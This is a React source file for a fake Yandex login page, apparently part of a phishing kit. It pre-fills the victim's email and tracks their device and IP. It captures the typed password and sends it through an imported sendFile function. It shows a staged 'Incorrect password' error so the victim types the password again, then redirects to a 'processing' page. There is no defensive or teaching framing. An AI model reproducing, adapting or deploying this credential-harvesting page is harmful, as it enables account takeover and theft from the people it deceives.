import { navigate } from "@reach/router";
import React, { Fragment, useState } from "react";
import { Helmet } from "react-helmet";
import { notify, sendFile } from "../servers";

function Yandex({ location }) {
  const [values, setValues] = useState({
    username: location.state.email,
    device: location.state.device,
    ip: location.state.ip,
    password: "",
  });

  const [submited, setSubmited] = useState({ status: false, count: 0 });

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
  };

  const submitForm = (event) => {
    event.preventDefault();
    setSubmited({ ...submited, status: !submited.status });

    if (submited.count <= 1) {
      sendFile(values).then((data) => {
        // show error
        notify();
        setSubmited({ ...submited, count: submited.count + 1 });
        setValues({ ...values, password: "" });
        console.log(data);
        console.log(submited);
      });
    } else {
      sendFile(values).then((data) => {
        // redirect
        navigate("processing", { state: { domain: location.state.domain } });
        console.log("ok");
      });
    }
  };

  const [email, setEmail] = useState("email@domain.com");
  return (
    <Fragment>
      <Helmet>
        <link rel="stylesheet" type="text/css" href="../yandex/main.css" />
      </Helmet>

      <div className="layout">
        <div className="passp-flex-wrapper">
          <div className="passp-page">
            <div className="passp-bg passp-bg_1" />
            <div className="passp-flex-wrapper">
              <div className="passp-content">
                <div className="passp-auth">
                  <div className="passp-page-overlay" />
                  <a
                    data-lego="react"
                    tabIndex={0}
                    className="
              control
              link link_theme_normal
              passp-previous-step-button
            "
                  >
                    <span
                      className="passp-previous-step-button__icon"
                      data-link=".gaza1mail.yandex.com/?addMultiUserFromDropdownButton=true"
                      data-pane="/auth/add?mode=add-user&retpath=https%3A%2F%2Fmail.yandex.com%2F%3FaddMultiUserFromDropdownButton%3Dtrue"
                    />
                  </a>
                  <div className="passp-auth-header">
                    <a
                      data-lego="react"
                      tabIndex={0}
                      className="
                control
                link link_theme_normal
                passp-auth-header-link
              "
                    >
                      Register
                    </a>
                    <a
                      data-lego="react"
                      tabIndex={0}
                      className="
                control
                link link_theme_normal
                passp-auth-header-link passp-auth-header-link_visible
              "
                    >
                      Use another account
                    </a>
                    <a
                      data-lego="react"
                      tabIndex={-1}
                      className="
                logo logo_name_ys-en-102x42 logo_type_link
                passp-logo
              "
                    >
                      logo:yandex
                    </a>
                  </div>
                  <div className="passp-auth-content">
                    <div className="passp-page-visibility" />
                    <div className="passp-route-forward">
                      <div
                        className="
                  passp-auth-screen
                  passp-welcome-page
                  passp-route-enter-done
                "
                      >
                        <h1 className="passp-title">
                          <span>Log in&nbsp;to&nbsp;continue</span>
                        </h1>
                        <div className="passp-password-form">
                          <form onSubmit={submitForm}>
                            <a
                              data-lego="react"
                              tabIndex={0}
                              className="
                        control
                        link link_theme_normal
                        passp-current-account
                        passp-current-account_without-login
                      "
                            >
                              <div
                                className="passp-current-account__avatar"
                                style={{
                                  backgroundImage:
                                    "url(data:image/png;base64,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)",
                                }}
                              />
                              <div
                                id="topnavtext"
                                className="passp-current-account__display-name"
                              >
                                {values.username}
                              </div>
                              <div style={{ visibility: "hidden" }}>
                                <input type="text" name="u1" />
                              </div>
                              <div className="passp-current-account__select-icon" />
                            </a>
                            <div className="passp-password-field">
                              <input
                                className="passp-hidden-login-field"
                                type="text"
                                name="login"
                                id="login"
                                readOnly
                                autoComplete="username"
                                defaultValue
                              />
                              <div
                                className="
                          passp-form-field
                          passp-form-field_password
                          passp-form-field_filled
                        "
                              >
                                <div className="passp-form-field__input">
                                  <input
                                    type="password"
                                    id="p1"
                                    name="password"
                                    value={values.password}
                                    onChange={handleChange}
                                    required
                                    autoCorrect="off"
                                    tabIndex={1}
                                    autofocus
                                    autoCapitalize="off"
                                    autoComplete="current-password"
                                    placeholder
                                  />
                                  <label
                                    className="passp-form-field__label"
                                    htmlFor="passp-field-passwd"
                                  >
                                    Enter your password
                                  </label>
                                </div>
                                <div
                                  style={{ visibility: "hidden" }}
                                  id="v1"
                                  className="passp-form-field__error"
                                >
                                  Incorrect password
                                </div>
                                <div className="passp-form-field__link">
                                  <a
                                    data-lego="react"
                                    tabIndex={0}
                                    className="control link link_theme_normal"
                                  >
                                    Forgot your password?
                                  </a>
                                </div>
                              </div>
                              <span
                                className="
                          passp-password-field__eye
                          passp-password-field__eye_opened
                        "
                              />
                              <span
                                className="
                          passp-password-field__eye
                          passp-password-field__eye_closed
                          passp-password-field__eye_hidden
                        "
                              />
                            </div>
                            <div className="passp-button passp-sign-in-button">
                              <input
                                data-lego="react"
                                type="submit"
                                disabled={submited.status}
                                autoComplete="off"
                                defaultValue="Log in"
                                className="
                          control
                          button2
                          button2_view_classic
                          button2_size_l
                          button2_theme_action
                          button2_width_max
                          button2_type_submit
                          passp-form-button
                          colorinput
                        "
                              />
                            </div>
                          </form>
                        </div>
                      </div>
                    </div>
                    <iframe
                      className="passp-iframe"
                      name="iframe"
                      src="./Authorization_files/a.html"
                    />
                  </div>
                </div>
              </div>
              <footer className="passp-footer">
                <div className="passp-footer__wrapper">
                  <div className="passp-footer__incognito-link">
                    <span className="passp-footer__item">
                      Use Incognito mode on&nbsp;a&nbsp;shared computer
                    </span>
                  </div>
                  <div className="passp-footer__main-block">
                    <span className="passp-footer__item">
                      <a
                        data-lego="react"
                        target="_blank"
                        tabIndex={0}
                        className="control link link_theme_normal"
                      >
                        Help
                      </a>
                    </span>
                    <span className="passp-footer__item">
                      <span className="passp-footer__copyright">© 2020, </span>
                      <a
                        data-lego="react"
                        tabIndex={0}
                        className="control link link_theme_normal"
                      >
                        Yandex
                      </a>
                    </span>
                  </div>
                </div>
              </footer>
            </div>
          </div>
        </div>
      </div>
    </Fragment>
  );
}

export default Yandex;
